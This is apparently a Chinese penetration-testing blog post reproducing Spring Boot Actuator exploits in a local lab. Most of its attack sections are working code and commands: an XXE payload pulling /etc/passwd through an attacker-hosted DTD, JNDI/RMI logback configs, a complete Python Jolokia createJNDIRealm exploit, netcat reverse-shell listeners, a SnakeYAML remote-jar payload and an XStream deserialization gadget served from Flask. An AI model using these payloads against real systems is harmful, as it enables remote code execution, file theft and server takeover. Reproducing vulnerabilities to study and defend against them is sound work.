---
title: "Spring Boot Rce"
date: 2020-06-01T11:13:27+08:00
draft: flase
tags: [Spring boot]
categories: [渗透测试]
comment: true
---
Spring Boot漏洞复现
<!--more-->

# Spring Boot漏洞复现

_复现一下Sprint Boot的一些漏洞_

- 环境搭建

*Dump环境*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200521132309.png)

*Mvn构建项目*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200521132421.png)

*启动项目*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200521135810.png)

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200521162025.png)

- 端点信息

```
路径            描述
/autoconfig    提供了一份自动配置报告，记录哪些自动配置条件通过了，哪些没通过
/beans         描述应用程序上下文里全部的Bean，以及它们的关系
/env           获取全部环境属性
/configprops   描述配置属性(包含默认值)如何注入Bean
/dump          获取线程活动的快照
/health        报告应用程序的健康指标，这些值由HealthIndicator的实现类提供
/info          获取应用程序的定制信息，这些信息由info打头的属性提供
/mappings      描述全部的URI路径，以及它们和控制器(包含Actuator端点)的映射关系
/metrics       报告各种应用程序度量信息，比如内存用量和HTTP请求计数
/shutdown      关闭应用程序，要求endpoints.shutdown.enabled设置为true
/trace         提供基本的HTTP请求跟踪信息(时间戳、HTTP头等)
```

- Spring Boot 1.x版本端点在根URL下注册

*2.x版本端点移动到/actuator/路径*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200521215258.png)

## Jolokia漏洞利用

### Jolokia漏洞利用（XXE）

- jolokia/list 

**查看jolokia/list中存在的 Mbeans，是否存在logback 库提供的reloadByURL方法**

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200521215727.png)

- 创建logback.xml和fileread.dtd文件

**logback.xml**

```
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE a [ <!ENTITY % remote SYSTEM "http://x.x.x.x/fileread.dtd">%remote;%int;]>
<a>&trick;</a>
```

**fileread.dtd**

```
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % int "<!ENTITY trick SYSTEM ':%d;'>">
```

- 将文件上传到公网VPS上并且开启http服务

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200521221754.png)

- 远程访问logback.xml文件

**127.0.0.1:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/x.x.x.x!/logback.xml**

- 成功利用xxe读取到etc/passwd文件内容

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200521221839.png)

### Jolokia漏洞利用（RCE）

- 下载修改RMI服务代码

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200521223234.png)

- 编译打包

```
mvn clean install
```

*打包成功后创建target目录下生成RMIServer-0.1.0.jar文件*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200521225708.png)

- 修改logback.xml文件内容

```
 <configuration>
  <insertFromJNDI env-entry-name="rmi://x.x.x.x:1097/jndi" as="appName" />
</configuration>
```

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200521223544.png)

- 把RMIServer-0.1.0.jar文件上传到公网vps上并执行

```
java -Djava.rmi.server.hostname=x.x.x.x -jar RMIServer-0.1.0.jar
```

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200521225901.png)

- nc监听

```
nc -lvp 6666
```

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200521225957.png)

- 漏洞url上访问

```
http://127.0.0.1:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/xxx.xxx.xxx.xxx!/logback.xml
```

- 反弹shell

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200521231326.png)

### Jolokia漏洞利用（RCE-createJNDIRealm方法）

>查看/jolokia/list 中存在的是否存在org.apache.catalina.mbeans.MBeanFactory类提供的createJNDIRealm方法，可能存在JNDI注入，导致远程代码执行

- python执行脚本

```
import requests as req
import sys
from pprint import pprint

url = sys.argv[1] + "/jolokia/"
pprint(url)
#创建JNDIRealm
create_JNDIrealm = {
    "mbean": "Tomcat:type=MBeanFactory",
    "type": "EXEC",
    "operation": "createJNDIRealm",
    "arguments": ["Tomcat:type=Engine"]
}
#写入contextFactory
set_contextFactory = {
    "mbean": "Tomcat:realmPath=/realm0,type=Realm",
    "type": "WRITE",
    "attribute": "contextFactory",
    "value": "com.sun.jndi.rmi.registry.RegistryContextFactory"
}
#写入connectionURL为自己公网RMI service地址
set_connectionURL = {
    "mbean": "Tomcat:realmPath=/realm0,type=Realm",
    "type": "WRITE",
    "attribute": "connectionURL",
    "value": "rmi://x.x.x.x:1097/jndi"
}
#停止Realm
stop_JNDIrealm = {
    "mbean": "Tomcat:realmPath=/realm0,type=Realm",
    "type": "EXEC",
    "operation": "stop",
    "arguments": []
}
#运行Realm，触发JNDI 注入
start = {
    "mbean": "Tomcat:realmPath=/realm0,type=Realm",
    "type": "EXEC",
    "operation": "start",
    "arguments": []
}

expoloit = [create_JNDIrealm, set_contextFactory, set_connectionURL, stop_JNDIrealm, start]

for i in expoloit:
    rep = req.post(url, json=i)
    pprint(rep.json())

```

- 运行RMI服务

```
java -Djava.rmi.server.hostname=x.x.x.x -jar RMIServer-0.1.0.jar
```

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200522174149.png)

- nc 监听

```
nc -lvp 6666
```

- python发送请求

```
python exp.py http://127.0.0.1:8090
```

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200522174426.png)

- 反弹shell

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200521231326.png)

##  env端点利用
### SpringBoot env 获取* 敏感信息

> 如果Spring Cloud Libraries在路径中，则'/env'端点会默认允许修改Spring环境属性。 “@ConfigurationProperties”的所有bean都可以进行修改和重新绑定。 

- 例如要获取PID（这是假设，假设PID为**）

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200521232802.png)

- 修改enveureka.client.serviceUrl.defaultZone属性

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200522142507.png)

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200522165111.png)

- nc监听

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200522145420.png)

- refresh

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200522165141.png)

- base64解码获取属性

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200522165333.png)

### spring Cloud env yaml利用

>当spring boot使用Spring Cloud 相关组件时，会存在spring.cloud.bootstrap.location属性，通过修改 spring.cloud.bootstrap.location 环境变量实现 RCE

- 利用范围

**Spring Boot 2.x 无法利用成功
Spring Boot 1.5.x 在使用 Dalston 版本时可利用成功，使用 Edgware 无法成功
Spring Boot <= 1.4 可利用成功**

- 下载exp修改执行命令

```
https://github.com/artsploit/yaml-payload
```

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200522180648.png)

- 将java文件进行编译

```
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
```

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200522180846.png)

- 创建yaml文件并放到公网

```
 !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[
!!java.net.URL ["http://xxx.xxx.xxx.xxx:8000/yaml-payload.jar"] ]]
]
```

- 修改 spring.cloud.bootstrap.location为外部 yml 配置文件地址

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200522182158.png)

- 请求 /refresh 接口触发

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200522181825.png)

- 执行命令成功

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200522182248.png)

### xstream反序列化

- 前提条件

**Eureka-Client <1.8.7（多见于Spring Cloud Netflix）**

- 在VPS创建xstream文件，使用flask返回application/xml格式数据

```
from flask import Flask, Response

app = Flask(__name__)
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods = ['GET', 'POST'])
def catch_all(path):
    xml = """<linked-hash-set>
  <jdk.nashorn.internal.objects.NativeString>
    <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
      <dataHandler>
        <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
          <is class="javax.crypto.CipherInputStream">
            <cipher class="javax.crypto.NullCipher">
              <serviceIterator class="javax.imageio.spi.FilterIterator">
                <iter class="javax.imageio.spi.FilterIterator">
                  <iter class="java.util.Collections$EmptyIterator"/>
                  <next class="java.lang.ProcessBuilder">
                    <command>
                      <string>命令</string>
                    </command>
                    <redirectErrorStream>false</redirectErrorStream>
                  </next>
                </iter>
                <filter class="javax.imageio.ImageIO$ContainsFilter">
                  <method>
                    <class>java.lang.ProcessBuilder</class>
                    <name>start</name>
                    <parameter-types/>
                  </method>
                  <name>foo</name>
                </filter>
                <next>foo</next>
              </serviceIterator>
              <lock/>
            </cipher>
            <input class="java.lang.ProcessBuilder$NullInputStream"/>
            <ibuffer></ibuffer>
          </is>
        </dataSource>
      </dataHandler>
    </value>
  </jdk.nashorn.internal.objects.NativeString>
</linked-hash-set>"""
    return Response(xml, mimetype='application/xml')
```

- 启动服务

```
python3 flask_xstream.py
```

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200522195600.png)

- 写入配置

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200522195921.png)

- 刷新触发

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200522195952.png)

- 获取反弹shell

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200522195843.png)

## 参考

[一次曲折的渗透测试之旅](https://mp.weixin.qq.com/s/HmGEYRcf1hSVw9Uu9XHGsA)

[Spring Boot Actuator 漏洞利用](https://www.freebuf.com/column/234266.html)

[Spring Boot Actuators配置不当导致RCE漏洞复现](https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/)